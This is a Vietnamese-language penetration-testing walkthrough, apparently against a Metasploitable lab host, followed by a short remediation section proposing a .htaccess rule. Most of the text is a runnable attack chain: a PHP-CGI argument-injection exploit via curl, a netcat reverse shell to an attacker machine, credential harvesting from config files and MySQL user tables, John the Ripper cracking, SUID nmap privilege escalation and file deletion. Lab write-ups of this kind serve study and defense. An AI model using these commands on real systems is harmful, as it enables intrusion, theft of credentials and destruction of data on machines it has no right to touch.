## Tùy chọn lệnh
```
curl -s -X POST "http://192.168.80.10/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('whoami'); die(); ?>" --connect-timeout 10
```

## Chím Shell phiên bản ngoài đời thực

-Lắng nghe:
```
nc -lvnp 4444
```

- Thự hiện shell ngược:
```
curl -s -X POST "http://192.168.80.10/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('nc 192.168.80.2 4444 -e /bin/sh'); die(); ?>" --connect-timeout 10
```

- Chím shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- 📁 4. Khám phá thư mục home, có thể chứa thông tin nhạy cảm [*]
```
cd /home
ls -la
```

- 🔑 5. Tìm kiếm thông tin nhạy cảm: mật khẩu, private key, cấu hình database
```
find /var/www -type f -iname "*config*.php"
```

- 🔍 Đặc biệt chú ý các file trong dvwa, mutillidae, phpMyAdmin, tikiwiki: [*]
cat /var/www/dvwa/config/config.inc.php

```
cat /var/www/dvwa/config/config.inc.php
```

- 🔄 7. Nếu có thông tin đăng nhập MySQL, thử đăng nhập: [*]
```
mysql -u root -p
```

```
show databases;
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
USE mysql;
SELECT user, host, password FROM user;
```

```
USE owasp10;
SHOW TABLES;
SELECT * FROM accounts;
```


```
exit
```
## Crack password

```
john --format=<format> hashes.txt
```

```
john --show hashes.txt
```

```
john --session=new_session --wordlist=/path/to/wordlist.txt hashes.txt
```

```
john --wordlist=rockyou.txt --format=nt hashes.txt
```



## Test đăng nhập

- Xem người dùng trong hệ thống
```
cat /etc/passwd
```

## Thăng Quyền

```
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/nmap --interactive
```

```
!sh
```

```
whoami
```

> - Bạn là người thường (www-data), muốn vào phòng VIP.
> - Có một người khác được cấp quyền root tên là nmap(/usr/bin/nmap)
> - Khi bạn nhờ robot làm giúp ("--interactive")
> - Bạn bảo: “Mở cửa phòng VIP giúp tôi nhé!” (!sh)
> - Robot dùng quyền của nó để mở cửa, vậy là bạn vào được(chạy dưới quyền root)!

## Tạo thư mục
```
mkdir haidang
```


## xóa file
```
rm index.php
```






# 🛡️ 4. Đề xuất khắc phục

## Lọc Tham Số Nguy Hiểm
> `-d` `-n` `-s` ...

```
export TERM=xterm
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.80.10
```


```
cd /var/www
sudo nano .htaccess
```

- Dán nội dung sau:
```
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
  RewriteRule ^.* - [F,L]
</IfModule>
```

- reload
```
sudo a2enmod rewrite
sudo /etc/init.d/apache2 force-reload
```

---

- 🛠 Cho phép Apache sử dụng .htaccess
```
sudo nano /etc/apache2/sites-available/default
```

- Tìm:
```
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    allow from all
</Directory>
```

- ➡ Sửa dòng AllowOverride None thành:
```
AllowOverride All
```

- AllowOverride All

```
sudo /etc/init.d/apache2 restart
```

---

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```
